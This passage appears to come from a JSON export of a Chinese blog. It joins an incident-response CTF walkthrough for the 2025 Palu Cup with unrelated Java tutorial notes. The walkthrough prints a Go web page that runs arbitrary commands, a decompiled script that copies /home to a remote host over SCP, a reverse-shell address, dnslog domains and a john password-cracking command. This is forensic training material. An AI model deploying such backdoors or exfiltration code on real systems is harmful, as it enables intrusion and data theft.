\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmdInput) stdout, err := cmd.CombinedOutput() execTime := time.Since(start).Seconds() result := Command{ Input: cmdInput, Output: string(stdout), ExecTime: execTime, } if err != nil { result.Output += \u0026#34;\\n\u0026#34; + err.Error() } // 发送日志到通道 logChan \u0026lt;- CommandLog{ Timestamp: time.Now(), IP: clientIP, Command: cmdInput, Output: string(stdout), ExecTime: execTime, Error: fmt.Sprintf(\u0026#34;%v\u0026#34;, err), } tmpl.Execute(w, result) }) fmt.Println(\u0026#34;Server running on :8080\u0026#34;) http.ListenAndServe(\u0026#34;:8080\u0026#34;, nil) } // 获取客户端真实IP func getClientIP(r *http.Request) string { // 处理代理情况 if ip := r.Header.Get(\u0026#34;X-Forwarded-For\u0026#34;); ip != \u0026#34;\u0026#34; { return strings.Split(ip, \u0026#34;,\u0026#34;)[0] } if ip := r.Header.Get(\u0026#34;X-Real-IP\u0026#34;); ip != \u0026#34;\u0026#34; { return ip } ip, _, _ := net.SplitHostPort(r.RemoteAddr) return ip } // 异步处理日志 func handleLogs() { // 确保日志文件存在 f, err := os.OpenFile(\u0026#34;command.log\u0026#34;, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644) if err != nil { log.Fatal(err) } defer f.Close() for logEntry := range logChan { // 格式化日志条目 logLine := fmt.Sprintf( \u0026#34;[%s] IP: %-15s | Command: %-20s | ExecTime: %.4fs | Error: %-10v | Output: %s\\n\u0026#34;, logEntry.Timestamp.Format(\u0026#34;2006-01-02 15:04:05\u0026#34;), logEntry.IP, strings.TrimSpace(logEntry.Command), logEntry.ExecTime, logEntry.Error, strings.TrimSpace(logEntry.Output), ) // 同时输出到控制台和文件 log.Print(logLine) if _, err := f.WriteString(logLine); err != nil { log.Printf(\u0026#34;Failed to write log: %v\u0026#34;, err) } } } // ... 保持原有的 htmlTemplate 不变 ... const htmlTemplate = ` \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;parloo服务器维护页面\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;style\u0026gt; body { background: #1a1a1a; color: #ffffff; min-height: 100vh; } .container { padding-top: 2rem; } .terminal { background: #000; border-radius: 5px; padding: 1rem; margin-top: 1rem; font-family: monospace; white-space: pre-wrap; } .form-control { background: #333; color: #fff; border: 1px solid #444; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt;\t\u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-center mb-4\u0026#34;\u0026gt;parloo服务器维护页面\u0026lt;/h1\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;input-group mb-3\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; name=\u0026#34;cmd\u0026#34; placeholder=\u0026#34;Enter command...\u0026#34; required\u0026gt; \u0026lt;button class=\u0026#34;btn btn-danger\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Execute\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; {{if .Input}} \u0026lt;div class=\u0026#34;result\u0026#34;\u0026gt; \u0026lt;h5\u0026gt;Command: \u0026lt;code\u0026gt;{{.Input}}\u0026lt;/code\u0026gt;\u0026lt;/h5\u0026gt; \u0026lt;h5\u0026gt;Execution Time: {{.ExecTime}}s\u0026lt;/h5\u0026gt; \u0026lt;div class=\u0026#34;terminal\u0026#34;\u0026gt; {{.Output}} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{end}} \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ` 其中这里\n1 2 3 4 5 http.HandleFunc(\u0026#34;/admin/parloo\u0026#34;, func(w http.ResponseWriter, r *http.Request) { if r.Method == \u0026#34;GET\u0026#34; { tmpl.Execute(w, nil) return } 1 palu{/admin/parloo} 应急响应2-17 提交进源机器中恶意程序的MD5作为flag进行提交。 flag格式为palu{MD5小写}\n官方给的pdf里面写了palu03这台机是近源机器\n刚登上去就有一个程序svhost.exe未响应，非常可疑\n里面可以远程桌面，我们可以上传everything进去找\n1 certutil -hashfile svhost.exe MD5 1 palu{0f80a82621b8c4c3303d198d13776b34} 应急响应2-18 提交攻击者留下的恶意账户名称md5后作为flag进行提交。 格式为palu{md5{xxxxx}}\n前下就能看到有个恶意账号叫hack\n1 palu{d78b6f30225cdc811adfe8d4e7c9fd34} 应急响应2-19 提交内部群中留下的flag并提交\n点开内网通查看聊天记录得到flag\n1 palu{nbq_nbq_parloo} 应急响应2-20 请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交\n前下在server01那台机子上面找到危险功能，我们用xshell连接那台\n回头看前面的mian.go\n1 f, err := os.OpenFile(\u0026#34;command.log\u0026#34;, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644) 进机子搜索command.log\n找到三个\ncat第三个，可以查看到执行的命令记录\n这里有个cat flag命令\n1 palu{Server_Parloo_2025} 应急响应2-21 提交获取敏感内容IP的第一次执行命令时间作为flag进行提交。flag格式为palu{xxxx-xx-xx:xx:xx:xx}\n翻到最上面就行了\n1 palu{2025-05-04:15:30:38} 应急响应2-22 提交攻击者使用的恶意ip和端口flag格式为palu{xx.xx.xx.xx:xxxx}\n上面catflag完后执行了反弹shell命令\n1 palu{10.12.12.13:9999} 应急响应2-23 提交重要数据的明文内容作为flag提交\n前面palu03机子的桌面就有一个密文，直接提交不对看来是被加密了\n1 c3alc3c13e326020c3919093e1260525045e 这个需要爆破\n首先先去前面那个git仓库登入hack的账号\n但是密码未知，但是mysql服务启动了我们可以去查询,navicat连接\nuser表里面有hack的密码,由于hash不知道，我们新建一个账号替换他的密码\n不仅要改密码还要改salt值\n登入进来有个encode.py\n1 2 3 4 5 6 7 8 9 10 11 12 def custom_encrypt(text, key): encrypted = [] key_bytes = [ord(c) for c in key] for i, char in enumerate(text): shifted = ord(char) + (i % 5 + 1) xor_key = key_bytes[i % len(key_bytes)] xored = shifted ^ xor_key substituted = ((xored \u0026amp; 0x0F) \u0026lt;\u0026lt; 4) | ((xored \u0026amp; 0xF0) \u0026gt;\u0026gt; 4) encrypted.append(f\u0026#34;{substituted:02x}\u0026#34;) return \u0026#34;\u0026#34;.join(encrypted) 需要key,这里由于flag格式是palu{开头的，所以爆破密钥，最后推出key为MySecretKey\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 def custom_decrypt(ciphertext, key): decrypted = [] key_bytes = [ord(c) for c in key] for i in range(0, len(ciphertext), 2): hex_byte = ciphertext[i:i+2] substituted = int(hex_byte, 16) xored = ((substituted \u0026amp; 0x0F) \u0026lt;\u0026lt; 4) | ((substituted \u0026amp; 0xF0) \u0026gt;\u0026gt; 4) xor_key = key_bytes[(i // 2) % len(key_bytes)] shifted = xored ^ xor_key original_char_code = shifted - ((i // 2) % 5 + 1) decrypted.append(chr(original_char_code)) return \u0026#39;\u0026#39;.join(decrypted) key = \u0026#34;MySecretKey\u0026#34; ciphertext = \u0026#34;c3a1c3c13e326020c3919093e1260525045e\u0026#34; plaintext = custom_decrypt(ciphertext, key) print(plaintext) 1 palu{Password-000} 应急响应2-24 提交恶意维权软件的名称作为flag进行提交\n1 palu{svhost} 应急响应2-25 提交恶意程序的外联地址\n由于定位了黑客攻击时间段，我们用everthing查看5月4日到5月14日的东西\n发现ipconfig.exe\n看图标是python写的，我们直接python反编译一下\n先把exe反编译成pyc文件\n然后把pyc反编译为py文件\npython反编译 - 在线工具\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 #!/usr/bin/env python # visit https://tool.lu/pyc/ for more information # Version: Python 3.8 import os import paramiko from scp import SCPClient from pathlib import Path def create_ssh_client(server, port, username, password, key_path = (None, None)): \u0026#39;\u0026#39;\u0026#39; 创建SSH客户端连接 \u0026#39;\u0026#39;\u0026#39; client = paramiko.SSHClient() client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # WARNING: Decompyle incomplete def transfer_directory(scp, local_path, remote_path): \u0026#39;\u0026#39;\u0026#39; 递归传输目录 \u0026#39;\u0026#39;\u0026#39; for item in os.listdir(local_path): local_item = os.path.join(local_path, item) if os.path.islink(local_item): print(f\u0026#39;\u0026#39;\u0026#39;跳过符号链接: {local_item}\u0026#39;\u0026#39;\u0026#39;) continue remote_item = os.path.join(remote_path, item) if os.path.isdir(local_item): try: scp.mkdir(remote_item) finally: pass transfer_directory(scp, local_item, remote_item) continue print(f\u0026#39;\u0026#39;\u0026#39;传输文件中: {local_item}\u0026#39;\u0026#39;\u0026#39;) scp.put(local_item, remote_item) continue return None def main(): ssh_config = { \u0026#39;server\u0026#39;: \u0026#39;88.173.90.103\u0026#39;, \u0026#39;port\u0026#39;: 22, \u0026#39;username\u0026#39;: \u0026#39;ubuntu\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;OOWPWPWADADA\u0026#39; } local_home = \u0026#39;/home\u0026#39; remote_base = \u0026#39;/home/ubuntu/backup_home\u0026#39; # WARNING: Decompyle incomplete if __name__ == \u0026#39;__main__\u0026#39;: main() 1 palu{88.173.90.103} 应急响应2-26 提交攻击这使用的恶意dnslog域名作为flag进行提交\n这个在之前的cat flag那题下面就有,好几个\n1 2 3 https://zdcg1o9v.requestrepo.com/ w0tynrqr.requestrepo.com np85qqde.requestrepo.com 但是可以看到当最后一个dns域名执行whoami命令之后黑客反弹shell成功了\n1 palu{np85qqde.requestrepo.com} 应急响应2-27 提交寻找反序列化漏洞的端口作为flag进行提交\n前面fscan扫到高危漏洞9999端口\n1 palu{9999} 应急响应2-28 提交web服务泄露的密钥作为flag进行提交\n前面这个fscan并没有扫出反序列化漏洞,换afrog扫出shiro和heapdump泄露\n先把heapdump下下来\n然后用jdumpspider分析文件中的敏感信息\n这里就跑出来key了\n1 palu{QZYysgMYhG6/CzIJlVpR2g==} 应急响应2-29 提交攻击者开始攻击的时间作为flag进行提交。flag各式为palu{xxxx/xx/xx:xx:xx:xx}\n进雷池waf查看\n1 palu{2025/05/13:16:45:19} 应急响应2-30 提交攻击者在server中留下的账户密码作为flag进行提交。flag格式为palu{username/password}\nserver这台机看/etc/shadow\n用john爆破密码,把密码保存到1.txt\n1 $y$j9T$RlIs4rqy6D2PI46ntcuwZ0$WFD6WgX3XC4zp/5Y.Jq9yLcfhHK5Rdg6IeDq2Rrl791 1 john --format=crypt 1.txt 1 palu{parloohack/123456} 应急响应2-31 提交攻击者维权方法的名称作为flag进行提交\n换成parloohack账号，去他的目录下查看看到aa文件\n查看历史命令\n1 history 启动了那个服务\n1 palu{parloohack_script.service} 应急响应2-32 提交攻击者留下的木马md5后作为flag进行提交\n木马只可能是那个aa,历史命令执行了md5sum\n1 md5sum aa 直接算出来\n1 palu{4123940b3911556d4bf79196cc008bf4} 应急响应2-33 提交攻击者留下的溯源信息作为flag进行提交\n这里又要回到办公pc上面查看，这里是在palu02这台机子上有谷歌浏览器\n在密码管理里面找到了\n1 palu{X5E1yklz1oAdyHBZ} 应急响应2-34 提交攻击者的githubID作为flag进行提交\n841366067这个qq号，去看空间就能找到githubid\n1 palu{ParlooSEc} 应急响应2-35 提交攻击者在github下留下的的内容作为flag进行提交\n1 palu{s5o3WkX33hptyJjk} 应急响应2-36 提交恶意用户的数量作为flag进行提交\n登入palu01这台机的时候看到一堆palu\n1 palu{99} 应急响应2-37 提交恶意用户的默认密码作为flag进行提交\n根据前面爆破的我们猜是123456\n1 palu{123456} 应急响应2-38 提交业务数据中攻击者留下的信息作为flag进行提交\n之前数据库查看的flag还没用\n1 palu{crP1ZIVfqrkfdhGy} 应急响应2-39 提交私人git仓库中留下的内容作为flag进行提交\n同样操作把admin密码改了登入进去\n1 cGFsdXtGTzY1U3J1dVR1a2RwQlM1fQ== 1 palu{FO65SruuTukdpBS5} 应急响应2-40 提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交\n还是查看history\n发现.a文件\nfind命令找到它在root目录下面\n然后md5sum\n1 palu{ba7c9fc1ff58b48d0df5c88d2fcc5cd1} 应急响应2-41 提交恶意程序中模拟c2通信的函数名称作为flag进行提交\n拿到ida里面分析\n1 palu{simulate_network_communication} 应急响应2-42 提交恶意程序创建隐藏文件的名称作为flag提交\nida上面有个hidden_file函数\n双击跳转\n1 palu{.malware_log.txt} 应急响应2-43 提交恶意程序中模拟权限提升的函数作为flag进行提交\n1 palu{simulate_privilege_escalation} 应急响应2-44 提交被钓鱼上线的用户名作为flag进行提交\n查看内网通\n沉沉给子怡发了一个exe\n1 palu{Parloo-子怡} 应急响应2-45 提交恶意程序的所在路径作为flag进行提交\n1 palu{C:\\Users\\Public\\Nwt\\cache\\recv\\Parloo-沉沉} 应急响应2-46 分析恶意程序的反连地址作为flag进行提交\n这个就是之前浏览器记录的那个反连地址\n1 palu{47.101.213.153} 应急响应2-47 提交恶意c2的服务器登录的账号密码作为flag进行提交。flag格式为palu{username/password}\n这个前下也在浏览器密码管理里面看到了\n1 palu{admin/admin@qwer} ","date":"2025-05-26T00:00:00Z","image":"https://0d000721999.github.io/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/1.jpg","permalink":"https://0d000721999.github.io/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/","title":"2025帕鲁杯应急复现"},{"content":"Java 语法 hello world 1 2 3 4 5 public class Main { public static void main(String[] args) { System.out.println(\u0026#34;Hello World\u0026#34;); } } 运行时会生成.class文件，就是类，可以用javac 1.java生成类文件然后再java Main执行helloworld\n注释 单行//,多行/**/\n还有javadoc的文档注释\n1 2 3 4 //javadoc文档注释 /** * @Author gulu */ 数据类型 1 2 3 4 5 6 7 8 9 10 11 12 13 public class Main { public static void main(String[] args) { //System.out.println(\u0026#34;Hello World\u0026#34;); long a= 10L; float b=10f; double c=10d; boolean d=true; System.out.println(a);//10 System.out.println(b);//10.0 System.out.println(c);//10.0 System.out.println(d);//true } } 变量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class demo1 { static double a = 1.0;//类变量static String name;//实例变量 int age; public static void main(String[] args) { int i=10;//局部变量 System.out.println(i); demo1 obj = new demo1();//实例化类 System.out.println(obj.age); System.out.println(obj.name); System.out.println(a); } } 常量加final\n运算符 幂运算,导入Math类\n1 2 double a=Math.pow(2,3); System.out.println(a); 包 package\n引入别人包用import package xxx.xxx.xxx\nJavaDoc生成文档 1 2 3 4 5 6 7 8 9 10 11 12 13 public class Doc{ String name; /** * * @param name * @return * @throws Exception */ public String test(String name) throws Exception{ return name; } } 命令行\n1 javadoc -encoding xxx -charset xxx xxx.java Scanner next和hasNext搭配，识别空格前的字符，输出不带空格\nnextLine和hasNextLine搭配，识别回车前的字符，输出带空格\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import java.util.Scanner; public class demo1 { public static void main(String[] args) { Scanner s=new Scanner(System.in); System.out.println(\u0026#34;用next接收: \u0026#34;); if (s.hasNextLine()) { String s1=s.nextLine(); System.out.println(\u0026#34;输入的内容为：\u0026#34;+s1); } s.close(); } } 还有nextInt、nextFloat等，识别数据类型的\n循环 增强for循环\n1 2 3 4 5 6 7 8 public class Main { public static void main(String[] args) { int[]a={1,2,3,4,5}; for(int x:a){ System.out.println(x); } } } 方法 像函数\n1 2 3 4 5 6 7 8 9 10 public class Main { public static void main(String[] args) { int sum=add(1,2); System.out.println(sum); } public static int add(int a,int b){ return a+b; } } 可变参数 1 2 3 4 5 6 7 8 9 10 public class Main { public static void main(String[] args) { Main a=new Main(); a.test(1,2,3); } public void test(int...a){ System.out.println(a[0]); } } int...数据类型后面加...\n数组 1 2 3 4 5 6 7 8 9 10 public class Main { public static void main(String[] args) { int[] num; num=new int[10]; for (int i = 0; i \u0026lt; num.length; i++) { num[i]=i; System.out.println(num[i]); } } } 创建有两种方式\n1 2 int[] num; int num[]; 对象 利用new关键字创建对象\n1 2 3 4 5 6 7 public class Doc{ String name; int age; public void study(){ System.out.println(this.name); } } 在main里面创建\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Main { public static void main(String[] args) { Doc xiaoming = new Doc(); Doc xh = new Doc(); xiaoming.name = \u0026#34;xiaoming\u0026#34;; xh.name = \u0026#34;xh\u0026#34;; xiaoming.age = 20; xh.age = 10; System.out.println(xiaoming.name); System.out.println(xh.age); System.out.println(xiaoming.age); System.out.println(xh.name); } } 构造器 一个类什么都不写也会生成构造器，与类名相同\n使用new关键字本质上是调用构造器，用来初始化值\n有参构造：一旦定义有参构造，无参构造必须显示定义\nIDEA的快捷键生成构造器AIt+insert\n封装 1 2 3 4 5 6 7 8 9 10 11 public class Doc{ private String name; private int age; private String gender; public String getName(){ return this.name; } public void setName(String name){ this.name = name; } } private属性就不能直接被访问了，要用public方法才能调用\nmain里面\n1 2 3 4 5 6 7 8 9 public class Main { public static void main(String[] args) { Doc xiaoming = new Doc(); // xiaoming.name = \u0026#34;xiaoming\u0026#34;; // System.out.println(xiaoming.name); xiaoming.setName(\u0026#34;xiaoming\u0026#34;); System.out.println(xiaoming.getName()); } } 如果直接用.name会报错\n关于生成封装也可以用前面快捷键AIt+insert\n继承 extends关键字用于子类继承父类，所有类都继承父类Object类，跟ruby一样（\nsuper关键字用于调用父类中的变量\n父类\n1 2 3 public class Doc{ protected String name=\u0026#34;aaa\u0026#34;; } 子类\n1 2 3 4 5 6 7 8 public class Main extends Doc{ public String name=\u0026#34;bbb\u0026#34;; public void test(String name){ System.out.println(name); System.out.println(this.name); System.out.println(super.name); } } 实例化子类\n1 2 3 4 5 6 public class demo1 { public static void main(String[] args) { Main a=new Main(); a.test(\u0026#34;666\u0026#34;); } } 会依次输出666，bbb，aaa\n如果父类的方法是private无法被继承\n重写是父类与子类之间的，方法名一样，子类通过@Override注释来重写父类方法\n不能是静态方法，就是没有static关键字\n多态 子类型可以用父类型来创建\n1 2 3 Student s1=new Student(); Person s2=new Student(); Object s3=new Student(); 如果调用父类与子类相同方法，考虑子类的重写\n父类调用子类子类方法要类型强转弱\n子类有方法eat()\n父类调用要\n1 ((Student)s2).eat(); 抽象类 abstract关键字只有方法名字没有方法实现\n1 2 3 public abstract class aaa{ public abstract void test(); } 他的子类必须重写他的方法，如果他的子类也是抽象类就不要了\n抽象类也不能用new，必须要用子类来实现方法\n接口 interface关键字\n接口中不能写方法，需要有实现类\n类实现接口要用implenments关键字\n接口\n1 2 3 4 5 6 public interface Usersevice { void add(String name); void remove(String name); void update(String name); void check(String name); } 实现接口的类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public class UserserviceImpl implements Usersevice{ @Override public void remove(String name) { } @Override public void add(String name) { } @Override public void update(String name) { } @Override public void check(String name) { } } 一个类可以多继承接口\n内部类 1 2 3 4 5 6 7 8 9 10 11 12 public class out { public int id =999; public void outer(){ System.out.println(\u0026#34;outer method\u0026#34;); } public class in{ public void inner(){ System.out.println(\u0026#34;inner method\u0026#34;); } } } 调用\n1 2 3 4 5 6 7 public class Doc{ public static void main(String[] args) { out a = new out(); out.in b = a.new in(); b.inner(); } } 可以用这种方式来获取私有属性\n1 2 3 4 5 6 7 8 9 public class out { private int id =999; public class in{ public void getid(){ System.out.println(id); } } } 调用\n1 2 3 4 5 6 7 public class Doc{ public static void main(String[] args) { out a = new out(); out.in b = a.new in(); b.getid(); } } 会输出私有属性id999\n异常 try关键字监控区域，catch捕获异常,finally无论结果都会执行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Doc{ public static void main(String[] args) { int a=1; int b=0; try{ System.out.println(a/b); }catch(ArithmeticException e){ System.out.println(\u0026#34;Arithmetic Exception\u0026#34;); }finally{ System.out.println(\u0026#34;finally\u0026#34;); } } } catch里面填想要捕获的类型，最高的是Throwable\nthrow关键字在方法中主动抛出异常\n1 throw new ArithmeticException(); throws关键字在类主动抛出异常\n1 public void test(int a,int b) throws ArithmeticException{} 自定义异常\n1 2 3 4 5 6 7 8 9 10 11 12 13 public class myexception extends Exception{ private int details; public myexception() { this.details = 0; } @Override public String toString() { return \u0026#34;myexception{\u0026#34; + \u0026#34;details=\u0026#34; + details + \u0026#39;}\u0026#39;; } } 多线程 继承Thread类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package threaddemo; //继承Thread类,重写run方法，调用start开启线程 public class thread1 extends Thread { @Override public void run() { //run方法线程体 for (int i = 0; i \u0026lt; 10; i++) { System.out.println(\u0026#34;aaa\u0026#34;+i); } } public static void main(String[] args) { thread1 t1 = new thread1(); t1.start();//开启线程 //main线程，主线程 for (int i = 0; i \u0026lt; 10; i++) { System.out.println(\u0026#34;main\u0026#34;+i); } } } 两条线程同时执行，如果直接调用run方法会先执行run,调用start方法开启多线程，会交替执行\ncommons.io包的使用 官网下载包之后\n新建一个目录叫lib,把包放进去，右键把目录添加为库就行了\n练习用多线程下载图片\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package threaddemo; import org.apache.commons.io.FileUtils; import java.io.File; import java.io.IOException; import java.net.URL; public class thread2 extends Thread { private String url; private String name; public thread2(String url, String name) { this.url = url; this.name = name; } @Override public void run() { webdownloader webdownloader = new webdownloader(); webdownloader.download(url, name); System.out.println(\u0026#34;Download complete,and filename: \u0026#34; + name); } public static void main(String[] args) { thread2 t1 = new thread2(\u0026#34;https://haowallpaper.com/link/common/file/previewFileImg/15680526683050304\u0026#34;, \u0026#34;1.png\u0026#34;); thread2 t2 = new thread2(\u0026#34;https://haowallpaper.com/link/common/file/getCroppingImg/15758357910360384\u0026#34;, \u0026#34;2.png\u0026#34;); thread2 t3 = new thread2(\u0026#34;https://haowallpaper.com/link/common/file/getCroppingImg/16732268995923328\u0026#34;, \u0026#34;3.png\u0026#34;); t1.start(); t2.start(); t3.start(); } } class webdownloader{ public void download(String url,String name){ try { FileUtils.copyURLToFile(new URL(url),new File(name)); } catch (IOException e) { e.printStackTrace(); System.out.println(\u0026#34;io异常\u0026#34;); } } } 调用runnable接口 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package threaddemo; public class thread3 implements Runnable { @Override public void run() { //run方法线程体 for (int i = 0; i \u0026lt; 10; i++) { System.out.println(\u0026#34;aaa\u0026#34;+i); } } public static void main(String[] args) { thread3 thread3 = new thread3();//创建runnable接口实现类对象 // Thread thread1 = new Thread(thread3);//创建线程对象，通过线程对象开启线程，代理 // thread1.start(); new Thread(thread3).start(); //main线程，主线程 for (int i = 0; i \u0026lt; 10; i++) { System.out.println(\u0026#34;main\u0026#34;+i); } } } 感觉对后面学反序列化没有用，用到再学\n反射 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 package reflectiontest; public class demo1 { public static void main(String[] args) throws ClassNotFoundException { //通过反射获取类的Class对象 Class c1 = Class.forName(\u0026#34;reflectiontest.User\u0026#34;); System.out.println(c1); Class c2 = Class.forName(\u0026#34;reflectiontest.User\u0026#34;); //一个类在内存中只有一个Class对象 System.out.println(c1.hashCode()); System.out.println(c2.hashCode()); } } class User{ private String name; private int age; private int id; public User() { } public User(String name, int age, int id) { this.name = name; this.age = age; this.id = id; } public int getId() { return id; } public void setId(int id) { this.id = id; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#34;, id=\u0026#34; + id + \u0026#39;}\u0026#39;; } } 获取Class类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 package reflectiontest; public class demo2 { public static void main(String[] args) throws ClassNotFoundException { Person person = new Student(); System.out.println(person.name); //方式一：通过对象获得 Class c1 = person.getClass(); System.out.println(c1.hashCode()); //方式二：forname获得 Class c2 = Class.forName(\u0026#34;reflectiontest.Student\u0026#34;); System.out.println(c2.hashCode()); //方式三：通过类名.class获得 Class c3 = Student.class; System.out.println(c3.hashCode()); //方式四：基本内置类型的包装类都有一个Type属性 Class c4 = Integer.TYPE; System.out.println(c4);//int //获得父类类型 Class c5 = c1.getSuperclass(); System.out.println(c5); } } class Person { public String name; public Person() { } public Person(String name) { this.name = name; } @Override public String toString() { return \u0026#34;Person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } class Student extends Person { public Student() { this.name = \u0026#34;Student\u0026#34;; } } class Teacher extends Person { public Teacher() { this.name = \u0026#34;Teacher\u0026#34;; } } 所有类型的Class对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package reflectiontest; import java.lang.annotation.ElementType; public class demo3 { public static void main(String[] args) { Class c1 = Object.class;//类 Class c2 = Comparable.class;//接口 Class c3 = String[].class;//一维数组 Class c4 = int[][].class;//二维数组 Class c5 = Override.class;//注解 Class c6 = ElementType.class;//枚举类型 Class c7 = Integer.class;//基本数据类型 Class c8 = void.class;//void Class c9 = Class.class;//Class System.out.println(c1); System.out.println(c2); System.out.println(c3); System.out.println(c4); System.out.println(c5); System.out.println(c6); System.out.println(c7); System.out.println(c8); System.out.println(c9); //只要元素类型和维度一样，就是同一个Class int [] a =new int[10]; int [] b =new int[100]; System.out.println(a.getClass().hashCode()); System.out.println(b.getClass().hashCode()); } } 类的初始化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package reflectiontest; public class demo4 { static { System.out.println(\u0026#34;Main\u0026#34;); } public static void main(String[] args) throws ClassNotFoundException { //主动引用 //Son son = new Son(); //反射也会主动引用 //Class.forName(\u0026#34;reflectiontest.Son\u0026#34;); //不会产生类的引用的方法 //System.out.println(Son.b); //Son[] sons = new Son[10]; System.out.println(Son.M); } } class Father { static int b=3; static { System.out.println(\u0026#34;Father\u0026#34;); } } class Son extends Father { static { System.out.println(\u0026#34;Son\u0026#34;); m=300; } static int m =100; static final int M=1; } 类加载器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package reflectiontest; public class demo5 { public static void main(String[] args) { //获取系统类的加载器 ClassLoader classLoader = ClassLoader.getSystemClassLoader(); System.out.println(classLoader); //获取类加载器的父类加载器——\u0026gt;扩展类加载器 ClassLoader parent = classLoader.getParent(); System.out.println(parent); //获取扩展类加载器的父类加载器——\u0026gt;根加载器 ClassLoader parent1 = parent.getParent(); System.out.println(parent1); } } 获得类名getName，getSimpleName只获得名字,获得类属性getFields,找到public属性，getDeclaredFields获得全部属性，getMethods获得本类和父类的public方法，getDeclaredMethods获取本类的所有方法，getConstructors获得构造器\n利用反射动态创建对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package reflectiontest; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class demo6 { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException { Class c1=Class.forName(\u0026#34;reflectiontest.User\u0026#34;); // User user=(User)c1.newInstance();//无参构造 // System.out.println(user); // Constructor constructor=c1.getDeclaredConstructor(String.class,int.class,int.class);//有参构造 // User c2=(User)constructor.newInstance(\u0026#34;aaa\u0026#34;,1,2); // System.out.println(c2); User c3 = (User)c1.newInstance();//通过反射调用普通方法 Method setName = c1.getDeclaredMethod(\u0026#34;setName\u0026#34;, String.class); setName.invoke(c3, \u0026#34;test\u0026#34;); System.out.println(c3.getName()); User c4 = (User)c1.newInstance(); Field name=c1.getDeclaredField(\u0026#34;name\u0026#34;); name.setAccessible(true); name.set(c4,\u0026#34;test2\u0026#34;); System.out.println(c4.getName());//权限不够，元素是私有的,用setAccessible关闭安全检测 } } Springboot 用maven创建springboot项目\n本地端口可以在application.properties里面更改\n1 server.port=8080 接下来启动main，访问8080出现error界面就成功了\n接下来输出hello,world\n先在main.java的同级目录下面创接口\n1 2 3 4 5 6 7 8 9 10 11 12 package com.test.springtest.controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class hellocontroller { @RequestMapping(\u0026#34;/hello\u0026#34;) public String hell(){ return \u0026#34;hello,world\u0026#34;; } } 